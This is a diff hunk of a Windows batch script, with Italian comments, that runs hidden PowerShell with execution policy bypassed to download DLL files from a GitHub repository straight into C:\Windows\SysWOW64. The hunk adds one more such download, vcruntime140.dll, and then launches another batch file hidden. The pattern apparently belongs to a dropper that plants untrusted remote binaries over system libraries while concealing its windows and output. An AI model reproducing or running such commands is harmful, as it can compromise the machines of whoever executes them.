@@ -23,6 +23,8 @@ powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libcrypto-3.dll" -OutFile "C:\Windows\SysWOW64\libcrypto-3.dll" > $null
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libssl-3.dll" -OutFile "C:\Windows\SysWOW64\libssl-3.dll" > $null
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
+Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/vcruntime140.dll" -OutFile "C:\Windows\SysWOW64\vcruntime140.dll" > $null
 
 timeout /t 2 >nul
 :: Esegui wait_R.bat in modo nascosto
